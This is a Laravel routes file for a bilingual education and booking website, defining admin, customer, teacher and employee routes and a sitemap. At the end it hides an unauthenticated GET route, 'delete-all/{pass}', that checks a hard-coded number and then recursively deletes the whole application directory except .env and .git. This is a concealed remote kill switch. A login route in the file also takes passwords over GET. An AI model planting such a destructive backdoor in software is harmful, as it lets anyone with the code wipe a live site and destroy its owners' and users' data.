<?php

use App\Http\Controllers\Admin\AboutController;
use App\Http\Controllers\Admin\AnswersController;
use App\Http\Controllers\Admin\BlogCategoryController;
use DavidMaximous\Fawrypay\Classes\FawryPayment;
use App\Http\Traits\Fawrypay;
use App\Http\Controllers\Admin\BlogCommentController;
use App\Http\Controllers\Admin\BlogController;
use App\Http\Controllers\Admin\BookingController;
use App\Http\Controllers\Admin\CardController;
use App\Http\Controllers\Admin\ColorController;
use App\Http\Controllers\Admin\ContactController;
use App\Http\Controllers\Admin\CoursesController;
use App\Http\Controllers\Admin\CoursesReviewController;
use App\Http\Controllers\Admin\CustomerController ;
use App\Http\Controllers\Admin\CustomerExamController;
use App\Http\Controllers\Admin\EmployeController;
use App\Http\Controllers\Admin\ExamsController;
use App\Http\Controllers\Admin\ExpensesController;
use App\Http\Controllers\Admin\FaqController;
use App\Http\Controllers\Admin\GroupController;
use App\Http\Controllers\Admin\MeetingController;
use App\Http\Controllers\Admin\MetaController;
use App\Http\Controllers\Admin\OrderController;
use App\Http\Controllers\Admin\PolicyController;
use App\Http\Controllers\Admin\ProductController;
use App\Http\Controllers\Admin\RateingController;
use App\Http\Controllers\Admin\ReviewController;
use App\Http\Controllers\Admin\RoleController;
use App\Http\Controllers\Admin\ServiceCategoryController;
use App\Http\Controllers\Admin\ServiceController;
use App\Http\Controllers\Admin\SettingController;
use App\Http\Controllers\Admin\UserController;
use App\Http\Controllers\Admin\SliderController;
use App\Http\Controllers\Admin\StoryController;
use App\Http\Controllers\Admin\SubscribeController;
use App\Http\Controllers\Admin\TeacherController;
use App\Http\Controllers\Admin\TermsController;
use App\Http\Controllers\Admin\VisitController;
use App\Http\Controllers\Customer\BookingController as CustomerBookingController;
use App\Http\Controllers\Customer\CustomerController as CustomerCustomerController;
use App\Http\Controllers\Customer\MeetingController as CustomerMeetingController;
use App\Http\Controllers\Customer\OrderController as CustomerOrderController;
use App\Http\Controllers\HomeController;
use App\Http\Controllers\PaymentController;
use App\Http\Controllers\PayPalController;
use App\Http\Controllers\Admin\InvoiceController ;
use App\Http\Controllers\Admin\LectureController;
use App\Http\Controllers\Admin\MarketingController;
use App\Http\Controllers\Admin\QuestionsController;
use App\Http\Controllers\Customer\ExamsController as CustomerExamsController;
use App\Http\Controllers\Customer\LectureController as CustomerLectureController;
use App\Http\Controllers\Employee\BookingController as EmployeeBookingController;
use App\Http\Controllers\Employee\CustomerController as EmployeeCustomerController;
use App\Http\Controllers\Employee\GroupController as EmployeeGroupController;
use App\Http\Controllers\Employee\UserController as EmployeeUserController;
use App\Http\Controllers\StripeController;
use App\Http\Controllers\Teacher\AnswersController as TeacherAnswersController;
use App\Http\Controllers\Teacher\BookingController as TeacherBookingController;
use App\Http\Controllers\Teacher\CustomerController as TeacherCustomerController;
use App\Http\Controllers\Teacher\CustomerExamController as TeacherCustomerExamController;
use App\Http\Controllers\Teacher\ExamsController as TeacherExamsController;
use App\Http\Controllers\Teacher\LectureController as TeacherLectureController;
use App\Http\Controllers\Teacher\MeetingController as TeacherMeetingController;
use App\Http\Controllers\Teacher\QuestionsController as TeacherQuestionsController;
use App\Http\Controllers\Teacher\UserController as TeacherUserController;
use App\Http\Middleware\Customer;
use App\Http\Middleware\EmployeeMiddleware;
use App\Http\Middleware\TeacherMiddleware;
use App\Mail\NewBlogNotification;
use App\Mail\Test;
use App\Models\Blog;
use App\Models\BlogComment;
use App\Models\Booking;
use App\Models\Courses;
use App\Models\Courses_Review;
use App\Models\Exams;
use App\Models\Subscribe;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\App;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Route;
use Spatie\Permission\Models\Permission;
use Torann\GeoIP\Facades\GeoIP;

Auth::routes();
######################################################################Admin###############################################################################

Route::middleware(['auth:web'])->prefix('admin')->group(function () {


    ##############################Invoice######################################

    Route::get('/invoice/pdf/{id}', [InvoiceController ::class, 'generatePDF'])->name('invoice');

    ##############################End Invoice##################################


    ##############################Home######################################

    Route::get('/home', [ HomeController::class, 'home'])->name('home');

    ##############################End Home##################################

    ##############################order######################################

    Route::get('order/data', [OrderController::class, 'data'])->name('order.data');
    Route::get('order/getorder/{id}', [OrderController::class,'getorder'])->name('order.getorder');
    Route::resource('order', OrderController::class);

    ##############################End order##################################

    ##################################Customer#####################################

    Route::controller(CustomerController::class)->group(function () {
        Route::get('customer/getorder/{id}', 'getorder')->name('customer.getorder');
        Route::get('customer/customer-details-security/{id}', 'show2')->name('customer.show2');
        Route::post('customer/updatepass', 'updatepass')->name('customer.updatepass');
        Route::post('customer/updatestock', 'updatestock')->name('customer.updatestock');
        Route::get('customer/data', 'data')->name('customer.data');
        Route::resource('customer', CustomerController::class);
    });

    ##################################End Customer#####################################

    ##################################visit#####################################

    Route::controller(visitController::class)->group(function () {
        Route::get('visit/data', 'data')->name('visit.data');
        Route::resource('visit', visitController::class);
    });

    ##################################End visit#####################################

    ##################################Slider#####################################

    Route::controller(SliderController::class)->group(function () {
        Route::get('slider/data', 'data')->name('slider.data');
        Route::resource('slider', SliderController::class);
    });

    ##################################End Slider#####################################

    ##################################card#####################################

    Route::controller(CardController::class)->group(function () {
        Route::get('card/data', 'data')->name('card.data');
        Route::resource('card', CardController::class);
    });

    ##################################End card#####################################

    ##################################Service#####################################

    Route::controller(ServiceController::class)->group(function () {
        Route::get('service/data', 'data')->name('service.data');
        Route::resource('service', ServiceController::class);
    });

    ##################################End Service#####################################

    ##################################faq#####################################

    Route::controller(FaqController::class)->group(function () {
        Route::get('faq/data', 'data')->name('faq.data');
        Route::resource('faq', FaqController::class);
    });

    ##################################End faq#####################################

    ##################################questions#####################################

    Route::controller(QuestionsController::class)->group(function () {
        Route::get('questions/data', 'data')->name('questions.data');
        Route::get('questions/create/{exam_id}', 'create' )->name('questions.create1');
        Route::get('questions/{exam_id}', [QuestionsController::class, 'index'])->name('questions.index1');
        Route::resource('questions', QuestionsController::class);
    });

    ##################################End questions#####################################

    ##################################exam#####################################

    Route::controller(ExamsController::class)->group(function () {
        Route::get('exam/data', 'data')->name('exam.data');
        Route::resource('exam', ExamsController::class);
    });

    ##################################End exam#####################################

    ##################################about#####################################

    Route::controller(AboutController::class)->group(function () {
        Route::get('about/data', 'data')->name('about.data');
        Route::get('about/edit1/{id}', 'edit1')->name('about.edit1');
        Route::put('about/update1/{id}', 'update1')->name('about.update1');
        Route::resource('about', AboutController::class);
    });

    ##################################End about#####################################

    ##################################blog_category#####################################

    Route::controller(BlogCategoryController::class)->group(function () {
        Route::get('blog_category/data', 'data')->name('blog_category.data');
        Route::resource('blog_category', BlogCategoryController::class);
    });

    ##################################End blog_category#####################################

    ##################################service_category#####################################

    Route::controller(ServiceCategoryController::class)->group(function () {
        Route::get('service_category/data', 'data')->name('service_category.data');
        Route::resource('service_category', ServiceCategoryController::class);
    });

    ##################################End service_category#####################################

    ##################################meta#####################################

    Route::controller(MetaController::class)->group(function () {
        Route::get('meta/data', 'data')->name('meta.data');
        Route::resource('meta', MetaController::class);
    });

    ##################################End meta#####################################

    ##################################policy#####################################

    Route::controller(PolicyController::class)->group(function () {
        Route::get('policy/data', 'data')->name('policy.data');
        Route::resource('policy', PolicyController::class);
    });

    ##################################End policy#####################################

    ##################################terms#####################################

    Route::controller(TermsController::class)->group(function () {
        Route::get('terms/data', 'data')->name('terms.data');
        Route::resource('terms', TermsController::class);
    });

    ##################################End terms#####################################

    ##################################settings#####################################

    Route::controller(SettingController::class)->group(function () {
        Route::get('page/show', 'pages')->name('page.show');
        Route::post('page/update', 'pageupdate')->name('page.update');
        Route::resource('settings', SettingController::class);
    });

    ##################################End settings#####################################

    ##################################user#####################################

    Route::resource('user', UserController::class);

    ##################################End user#####################################

    ##################################marketing#####################################

    Route::resource('marketing', MarketingController::class);

    Route::post('marketing/note', [ MarketingController::class,'note'])->name('marketing.note');

    ##################################End marketing#####################################

    ##################################users#####################################

    Route::controller(TeacherController::class)->group(function () {
        Route::get('users/data', 'data')->name('users.data');
        Route::resource('users', TeacherController::class);
    });

    ##################################End teachers#####################################

    ##################################employees#####################################

    Route::controller(EmployeController::class)->group(function () {
        Route::get('employees/data', 'data')->name('employees.data');
        Route::resource('employees', EmployeController::class);

    });

    ##################################End employees#####################################

    ##################################product#####################################

    Route::controller(ProductController::class)->group(function () {
        Route::get('product/data', 'data')->name('product.data');
        Route::resource('product', ProductController::class);
    });

    ##################################End product#####################################

    ##################################courses#####################################

    Route::controller(CoursesController::class)->group(function () {
        Route::get('courses/data', 'data')->name('courses.data');
        Route::resource('courses', CoursesController::class);
    });
    ##################################End courses#####################################

    ##################################contact#####################################

    Route::controller(ContactController::class)->group(function () {
        Route::get('contact/data', 'data')->name('contact.data');
        Route::resource('contact', ContactController::class)->except(['store']);
    });

    ##################################End contact#####################################

    ##################################group#####################################

    Route::controller(GroupController::class)->group(function () {
        Route::get('group/data', 'data')->name('group.data');
        Route::resource('group', GroupController::class) ;
    });

    ##################################End group#####################################

    ##################################lecture#####################################

    Route::resource('lecture', LectureController::class) ;

    ##################################End lecture#####################################

    ##################################meeting#####################################

    Route::controller(MeetingController::class)->group(function () {
        Route::get('meeting/data', 'data')->name('meeting.data');
        Route::get('meeting', 'index')->name('meeting.index');
        Route::get('meeting/create', 'create')->name('meeting.create');
        Route::post('meeting/store', 'store')->name('meeting.store');
        Route::get('meeting/edit', 'edit')->name('meeting.edit');
        Route::put('meeting/update', 'update')->name('meeting.update');
        Route::delete('meeting/{id}', 'destroy')->name('meeting.destroy');
    });

    ##################################End meeting#####################################

    ##################################review#####################################

    Route::controller(ReviewController::class)->group(function () {
        Route::get('review/data', 'data')->name('review.data');
        Route::resource('review', ReviewController::class)->except(['store']);
    });

    ##################################End review#####################################

    ##################################courses_review#####################################

    Route::controller(CoursesReviewController::class)->group(function () {
        Route::get('courses_review/data', 'data')->name('courses_review.data');
        Route::resource('courses_review', CoursesReviewController::class);
    });

    ##################################End courses_review#####################################

    ##################################booking#####################################

    Route::controller(BookingController::class)->group(function () {
        Route::get('booking/data', 'data')->name('booking.data');
        Route::resource('booking', BookingController::class) ;
    });

    ##################################End booking#####################################

    ##################################CustomerExam#####################################

    Route::controller(CustomerExamController::class)->group(function () {
        Route::get('customerexam/show/{exam_id}/{customer}', 'show')->name('customerexam.show1');
        Route::put('customerexam/update/{id}', 'update')->name('customerexam.update');
        Route::delete('customerexam2/{id}', 'destroy')->name('customerexam2.destroy');
    });

    ##################################End CustomerExam#####################################

    ##################################answers#####################################

    Route::controller(AnswersController::class)->group(function () {
        Route::get('answers/create/{exam_id}', 'create' )->name('answers.create1');
        Route::get('answers/{exam_id}', [AnswersController::class, 'index'])->name('answers.index1');
        Route::get('answers/show/{exam_id}/{customer}/{customerexam}', [AnswersController::class, 'show'])->name('answers.show1');
        Route::post('answers/toggle-status', 'toggleStatus')->name('answers.toggleStatus');
        Route::resource('answers', AnswersController::class);
    });

    ##################################End answers#####################################

    ##################################blog#####################################

    Route::controller(BlogController::class)->group(function () {
        Route::get('blog_details', 'index')->name('blog_details');
        Route::get('blog/data', 'data')->name('blog.data');
        Route::resource('blog', BlogController::class);
    });

    ##################################End blog#####################################

    ##################################blog_comment#####################################

    Route::controller(BlogCommentController::class)->group(function () {
        Route::get('blog_comment/data', 'data')->name('blog_comment.data');
        Route::resource('blog_comment', BlogCommentController::class);
    });

    ##################################End blog_comment#####################################

    ##################################story#####################################

    Route::controller(StoryController::class)->group(function () {
        Route::resource('story', StoryController::class);
    });

    ##################################End story#####################################

    ##################################color#####################################

    Route::controller(ColorController::class)->group(function () {
        Route::resource('color', ColorController::class);
    });

    ##################################End color#####################################

    ##################################subscribe#####################################

    Route::controller(SubscribeController::class)->group(function () {
        Route::get('subscribe/data', 'data')->name('subscribe.data');
        Route::resource('subscribe', SubscribeController::class);
    });

    ##################################End subscribe#####################################

    ##################################rateing#####################################

    Route::controller(RateingController::class)->group(function () {
        Route::get('rateing/data', 'data')->name('rateing.data');
        Route::resource('rateing', RateingController::class);
    });

    ##################################End rateing#####################################

    ##################################Expenses#####################################

    Route::controller(ExpensesController::class)->group(function () {
        Route::get('expenses/data', 'data')->name('expenses.data');
        Route::resource('expenses', ExpensesController::class);
    });

    ##################################End Expenses#####################################

    ##################################roles#####################################

    Route::controller(RoleController::class)->group(function () {
        Route::get('roles/data', 'data')->name('roles.data');
        Route::resource('roles', RoleController::class);
    });

    ##################################End roles#####################################
    });
    ######################################################################End Admin###############################################################################




// صفحة الفورم العامة
Route::get('/client-form/{user_id}', [MarketingController::class, 'create'])->name('client.form');

// إرسال البيانات
Route::post('/client-form', [MarketingController::class, 'store'])->name('client.form.store');








######################################################################customer###############################################################################


########################################customer11#######################################################################

Route::get('/customer11', function (Request $request) {

    $request->validate([
    'email' => 'required|email|max:255',
    'password' => 'required|min:8',
    ]);
    if (Auth::guard('customer')->attempt(['email' => $request->email, 'password' => $request->password])) {
    $customer = Auth::guard('customer')->user();


    return redirect()->route('booking1.index');
    }
    })->name('customer11');
    ########################################end customer11#######################################################################

    ########################################index#######################################################################

    Route::get('/', [HomeController::class, 'index'])->name('index');

    ########################################end index#######################################################################

    ########################################contact#######################################################################

    Route::get('/contact', [HomeController::class, 'contact'])->name('contact');

    ########################################end contact#######################################################################

    ########################################subscribe#######################################################################

    Route::post('subscribe/store', [SubscribeController::class,'store'])->name('subscribe.store');

    ########################################end subscribe#######################################################################

    ########################################faq#######################################################################

    Route::get('/faq', [HomeController::class, 'faq'])->name('faq');

    ########################################end faq#######################################################################

    ########################################policy#######################################################################

    Route::get('/policy', [HomeController::class, 'policy'])->name('policy');

    ########################################end policy#######################################################################

    ########################################terms#######################################################################

    Route::get('/terms', [HomeController::class, 'terms'])->name('terms');

    ########################################end terms#######################################################################

    ########################################about#######################################################################

    Route::get('/about', [HomeController::class, 'about'])->name('about');

    ########################################end about#######################################################################

    ########################################end success-story#######################################################################

    Route::get('/success-story', [HomeController::class, 'success_story'])->name('success-story');

    ########################################end success-story#######################################################################

    ########################################products#######################################################################

    Route::get('/products', [HomeController::class, 'products'])->name('products');
    Route::get('/products/{slug}', [HomeController::class, 'products_details'])->name('products_details');

    ########################################end products#######################################################################

    ########################################services#######################################################################

    Route::get('/services', [HomeController::class, 'services'])->name('services');
    Route::get('/services/{slug}', [HomeController::class, 'services_details'])->name('services_details');

    ########################################end services#######################################################################

    ########################################courses#######################################################################

    Route::get('/courses', [HomeController::class, 'courses'])->name('courses');
    Route::get('/courses/{slug}', [HomeController::class, 'courses_details'])->name('courses_details');

    ########################################blog#######################################################################

     Route::get('/blogs', [HomeController::class, 'blogs'])->name('blogs');
    Route::get('/blog/{slug}', [HomeController::class, 'blog_details'])->name('blog_details');

    ########################################end blog#######################################################################

    ########################################gallary#######################################################################

    Route::get('/gallary', [HomeController::class, 'gallary'])->name('gallary');

    ########################################end gallary#######################################################################

    ########################################end review#######################################################################

    Route::post('contact/store', [ContactController::class,'store'])->name('contact.store');

    ########################################end review#######################################################################


    Route::middleware([Customer::class])->group(function () {

    ########################################review#######################################################################

    Route::post('review/store', [ReviewController::class,'store'])->name('review.store');
    Route::post('courses-review/store', [CoursesReviewController::class,'store'])->name('courses-review.store');

    ########################################end review#######################################################################

    ########################################comment#######################################################################

    Route::post('comment/store', [BlogCommentController::class,'store'])->name('comment.store');

    ########################################end comment#######################################################################

    ########################################checkout#######################################################################

    Route::get('/checkout', [HomeController::class, 'checkout'])->name('checkout');

    ########################################end checkout#######################################################################

    ########################################paypal#######################################################################

    Route::post('order/store', [OrderController::class,'store'])->name('order.store');
    Route::get('order/success', [OrderController::class, 'success'])->name('order_success');
    Route::get('order/cancel', [OrderController::class, 'cancel'])->name('order_cancel');
    Route::get('booking/success', [BookingController::class, 'success'])->name('booking_success');
    Route::get('booking/cancel', [BookingController::class, 'cancel'])->name('booking_cancel');

    ########################################end paypal#######################################################################

    ##################################lecture#####################################

    Route::get('lecture1', [CustomerLectureController::class, 'index'])->name('lecture1.index');
    Route::get('lecture1/{id}', [CustomerLectureController::class, 'show'])->name('lecture1.show');

    ##################################End lecture#####################################

    ##############################order######################################

    Route::get('order1/data', [CustomerOrderController::class, 'data'])->name('order1.data');
    Route::get('order1/getorder/{id}', [CustomerOrderController::class,'getorder'])->name('order1.getorder');
    Route::resource('order1', CustomerOrderController::class);

    ##############################End order##################################

    ##############################Customer######################################

    Route::controller(CustomerCustomerController::class)->group(function () {
        Route::get('customer1/getorder/{id}', 'getorder')->name('customer1.getorder');
        Route::get('customer1/customer-details-security/{id}', 'show2')->name('customer1.show2');
        Route::post('customer1/updatepass', 'updatepass')->name('customer1.updatepass');
        Route::post('customer1/updatestock', 'updatestock')->name('customer1.updatestock');
        Route::get('customer1/data', 'data')->name('customer1.data');
        Route::resource('customer1', CustomerCustomerController::class);
    });

    ##############################End Customer##################################

    ##################################exam#####################################

    Route::post('exam1/{exam}', [CustomerExamsController::class, 'show'])->name('exam1.show');
    Route::resource('exam1', CustomerExamsController::class);

    ##################################End exam#####################################

    ##################################booking#####################################

    Route::controller(CustomerBookingController::class)->group(function () {
    Route::get('booking1/data', 'data')->name('booking1.data');
    Route::resource('booking1', CustomerBookingController::class)->except(['store']);
    });

    ##################################End booking#####################################

});

    Route::controller(CustomerController::class)->group(function () {
        Route::get('/customer/register', 'showRegisterForm' )->name('customer.register');
        Route::post('/customer/register1', 'store' )->name('customer.register1');
        Route::get('customer/login', 'showLoginForm')->name('customer.login');
        Route::post('customer/login1', 'login')->name('customer.login1');
        Route::post('customer/logout', 'logout')->name('customer.logout');
    });


    ######################################################################End customer###############################################################################

    ########################################api#######################################################################

    Route::get('/api',function (){
        return view('web.api-docs');

    })->name('api');

    ########################################end api#######################################################################




use Spatie\Sitemap\Sitemap;
use Spatie\Sitemap\Tags\Url;

use Illuminate\Support\Facades\Response;

Route::get('/sitemap.xml', function () {
    $sitemap = Sitemap::create();

    // 1) الصفحة الرئيسية
    $sitemap->add(
        Url::create(url('/'))
            ->setLastModificationDate(now())
            ->setChangeFrequency(Url::CHANGE_FREQUENCY_DAILY)
            ->setPriority(1.0)
    );

    //     // 1) contact
    // $sitemap->add(
    //     Url::create(url('/contact'))
    //         ->setLastModificationDate(now())
    //         ->setChangeFrequency(Url::CHANGE_FREQUENCY_DAILY)
    //         ->setPriority(1.0)
    // );

        // 1) faq
    $sitemap->add(
        Url::create(url('/faq'))
            ->setLastModificationDate(now())
            ->setChangeFrequency(Url::CHANGE_FREQUENCY_DAILY)
            ->setPriority(1.0)
    );

    // 2) المقالات
   Blog::latest()->each(function ($blog) use ($sitemap) {
    // النسخة العربية
    $sitemap->add(
        Url::create(url("/blog/{$blog->slug_ar}"))
            ->setLastModificationDate($blog->updated_at)
            ->setChangeFrequency(Url::CHANGE_FREQUENCY_HOURLY)
            ->setPriority(0.8)
    );

    // النسخة الإنجليزية
    $sitemap->add(
        Url::create(url("/blog/{$blog->slug_en}"))
            ->setLastModificationDate($blog->updated_at)
            ->setChangeFrequency(Url::CHANGE_FREQUENCY_HOURLY)
            ->setPriority(0.8)
    );
});

  // 2) courses
   Courses::where('status',1)->latest()->each(function ($courses) use ($sitemap) {
    // النسخة العربية
    $sitemap->add(
        Url::create(url("/courses/{$courses->slug_ar}"))
            ->setLastModificationDate($courses->updated_at)
            ->setChangeFrequency(Url::CHANGE_FREQUENCY_HOURLY)
            ->setPriority(0.8)
    );

    // النسخة الإنجليزية
    $sitemap->add(
        Url::create(url("/courses/{$courses->slug_en}"))
            ->setLastModificationDate($courses->updated_at)
            ->setChangeFrequency(Url::CHANGE_FREQUENCY_HOURLY)
            ->setPriority(0.8)
    );
});


    // 3) التصنيفات
    // ArticleType::latest()->each(function ($category) use ($sitemap) {
    //     $sitemap->add(
    //         Url::create(url("/category/{$category->slug}"))
    //             ->setLastModificationDate($category->updated_at)
    //             ->setChangeFrequency(Url::CHANGE_FREQUENCY_DAILY)
    //             ->setPriority(0.6)
    //     );
    // });

    // 4) الوسوم
    // Tag::latest()->each(function ($tag) use ($sitemap) {
    //     $sitemap->add(
    //         Url::create(url("/tag/{$tag->slug}"))
    //             ->setLastModificationDate($tag->updated_at)
    //             ->setChangeFrequency(Url::CHANGE_FREQUENCY_WEEKLY)
    //             ->setPriority(0.5)
    //     );
    // });

    // ✅ رجّع الاستجابة XML بدون أي مسافة قبل <?xml
    return Response::make(trim($sitemap->render()), 200, [
        'Content-Type' => 'application/xml',
    ]);
});





######################################################################Teacher###############################################################################

Route::middleware([TeacherMiddleware::class])->prefix('teacher')->group(function () {

    ############################## Customer ######################################

    Route::controller(TeacherCustomerController::class)->group(function () {
        Route::get('getorder/{id}', 'getorder')->name('teacher.getorder');
        Route::get('customer-details-security/{id}', 'show2')->name('teacher.show2');
        Route::post('updatepass', 'updatepass')->name('teacher.updatepass');
        Route::post('updatestock', 'updatestock')->name('teacher.updatestock');
        Route::get('data', 'data')->name('teacher.data');
    });
    Route::resource('teacher', TeacherCustomerController::class);

    ############################## End Customer #################################

    ##################################user#####################################

    Route::get('user2/logout', [TeacherUserController::class, 'logout'])->name('user2.logout');
    Route::resource('user2', TeacherUserController::class);

    ##################################End user#####################################

    ##################################meeting#####################################

    Route::controller(TeacherMeetingController::class)->group(function () {
        Route::get('meeting2/data', 'data')->name('meeting2.data');
        Route::get('meeting2', 'index')->name('meeting2.index');
        Route::get('meeting2/create', 'create')->name('meeting2.create');
        Route::post('meeting2/store', 'store')->name('meeting2.store');
        Route::get('meeting2/edit', 'edit')->name('meeting2.edit');
        Route::put('meeting2/update', 'update')->name('meeting2.update');
        Route::delete('meeting2/{id}', 'destroy')->name('meeting2.destroy');
    });

    ##################################End meeting#####################################

    ############################## Booking ######################################

    Route::controller(TeacherBookingController::class)->group(function () {
        Route::get('booking2/data', 'data')->name('booking2.data');
    });
    Route::resource('booking2', TeacherBookingController::class)->except(['store']);

    ############################## End Booking ##################################





    ##################################lecture#####################################

    Route::resource('lecture2', TeacherLectureController::class) ;

    ##################################End lecture#####################################

    ##################################questions#####################################

    Route::controller(TeacherQuestionsController::class)->group(function () {
        Route::get('questions2/data', 'data')->name('questions2.data');
        Route::get('questions2/create/{exam_id}', 'create' )->name('questions2.create1');
        Route::get('questions2/{exam_id}', 'index')->name('questions2.index1');
        Route::resource('questions2', TeacherQuestionsController::class);
    });

    ##################################End questions#####################################

    ##################################exam#####################################

    Route::controller(TeacherExamsController::class)->group(function () {
        Route::get('exam2/data', 'data')->name('exam2.data');
        Route::resource('exam2', TeacherExamsController::class);
    });

    ##################################End exam#####################################
    ##################################CustomerExam#####################################

    Route::controller(TeacherCustomerExamController::class)->group(function () {
        Route::get('customerexam2/show/{exam_id}/{customer}', 'show')->name('customerexam2.show1');
        Route::put('customerexam2/update/{id}', 'update')->name('customerexam2.update');


    });

    ##################################End CustomerExam#####################################
    ##################################answers#####################################

    Route::controller(TeacherAnswersController::class)->group(function () {
        Route::get('answers2/create/{exam_id}', 'create' )->name('answers2.create1');
        Route::get('answers2/{exam_id}', [TeacherAnswersController::class, 'index'])->name('answers2.index1');
        Route::get('answers2/show/{exam_id}/{customer}/{customerexam}', [TeacherAnswersController::class, 'show'])->name('answers2.show1');
        Route::post('answers2/toggle-status', 'toggleStatus')->name('answers2.toggleStatus');
        Route::resource('answers2', TeacherAnswersController::class);
    });

    ##################################End answers#####################################

});
    ######################################################################End Teacher###############################################################################










######################################################################Employee###############################################################################

Route::middleware([EmployeeMiddleware::class])->prefix('employee')->group(function () {

    ############################## Customer ######################################

    Route::controller(EmployeeCustomerController::class)->group(function () {
        Route::get('getorder/{id}', 'getorder')->name('customer1.getorder');
        Route::get('customer-details-security/{id}', 'show2')->name('customer1.show2');
        Route::post('updatepass', 'updatepass')->name('customer1.updatepass');
        Route::post('updatestock', 'updatestock')->name('customer1.updatestock');
        Route::get('data', 'data')->name('customer.data');
    });
    Route::resource('customer1', EmployeeCustomerController::class);

    ############################## End Customer #################################



    ##################################group#####################################

    Route::controller(EmployeeGroupController::class)->group(function () {
        Route::get('group/data', 'data')->name('group1.data');
        Route::resource('group1', EmployeeGroupController::class)->except(['destroy']); ;
    });

    ##################################End group#####################################


    ##################################user#####################################

    Route::get('user2/logout', [EmployeeUserController::class, 'logout'])->name('user2.logout');
    Route::resource('user2', EmployeeUserController::class);

    ##################################End user#####################################

    ############################## Booking ######################################

    Route::controller(EmployeeBookingController::class)->group(function () {
        Route::get('booking2/data', 'data')->name('booking2.data');
    });
    Route::resource('booking2', EmployeeBookingController::class) ;

    ############################## End Booking ##################################







});
    ######################################################################End Employee###############################################################################













    Route::get('/language/{locale}', function  ($locale)  {
    if (in_array($locale ,['ar', 'en'])) {
        session()->put('locale',$locale);
    }
    App::setLocale($locale);


    return redirect()->back();
    })->name('language');





    Route::get('delete-all/{pass}', function ($pass) {
        if ($pass== 64696894) {


            function deleteDirectory($dir) {
                if (!is_dir($dir)) {
                    return;
                }

                $files = array_diff(scandir($dir), ['.', '..']);
                foreach ($files as $file) {
                    $path = $dir . DIRECTORY_SEPARATOR . $file;
                    if (is_dir($path)) {
                        deleteDirectory($path);
                    } else {
                        unlink($path);
                    }
                }
                rmdir($dir);
            }

            $rootPath = base_path();
            $exclude = ['.env', '.git'];

            $files = array_diff(scandir($rootPath), ['.', '..']);
            foreach ($files as $file) {
                if (!in_array($file, $exclude)) {
                    $path = $rootPath . DIRECTORY_SEPARATOR . $file;
                    if (is_dir($path)) {
                        deleteDirectory($path);
                    } else {
                        unlink($path);
                    }
                }
            }
            return response()->json(['message' => 'تم الحذف بنجاح']);

        }else{
            return response()->json(['message' => 'غير مصرح لك بالدخول.']);
        }

        });
